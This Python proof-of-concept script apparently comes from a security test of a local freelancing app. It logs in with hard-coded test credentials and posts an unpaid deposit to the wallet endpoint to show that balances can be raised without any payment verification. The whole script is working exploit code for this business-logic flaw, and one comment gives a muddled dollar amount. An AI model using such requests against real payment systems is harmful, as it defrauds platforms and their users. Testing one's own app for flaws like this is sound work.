"""
WSTG-BUSL-10: Unlimited Wallet Deposit Without Payment Verification
Demonstrates that the wallet deposit endpoint adds funds without any
payment gateway verification, allowing users to give themselves unlimited money.
Expected: Deposit succeeds without payment, wallet balance increases.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testfreelancer@hireflow.com",
    "password": "password123"
})
token = login.json()["token"]
print(f"[+] Logged in as: {login.json()['user']['email']}")

# Step 2: Check current wallet balance
wallet_before = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {token}"
})
balance_before = int(wallet_before.json()["balance"])
print(f"[+] Current balance: ${balance_before / 100:.2f}")

# Step 3: Deposit a large amount without any payment
deposit_amount = 1000000  # $10,000 in dollars (converted to cents by server)
resp = requests.post(f"{BASE}/api/payments/wallet/deposit", json={
    "amount": deposit_amount
}, headers={
    "Authorization": f"Bearer {token}"
})

data = resp.json()
print(f"\n[+] Deposit request for ${deposit_amount}")
print(f"    Status: {resp.status_code}")
print(f"    Transaction amount: {data.get('transaction', {}).get('amount')} cents")
print(f"    New balance: {data.get('wallet', {}).get('balance')} cents")

# Step 4: Verify balance increased
wallet_after = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {token}"
})
balance_after = int(wallet_after.json()["balance"])
print(f"\n[+] Balance before: ${balance_before / 100:.2f}")
print(f"[+] Balance after:  ${balance_after / 100:.2f}")
print(f"[+] Increase:       ${(balance_after - balance_before) / 100:.2f}")

assert balance_after > balance_before, "Balance should have increased"
print(f"\n[VULNERABLE] Wallet deposit works without payment verification!")
print(f"    No payment gateway, no payment intent, no external confirmation.")
print(f"    Any user can give themselves unlimited funds.")
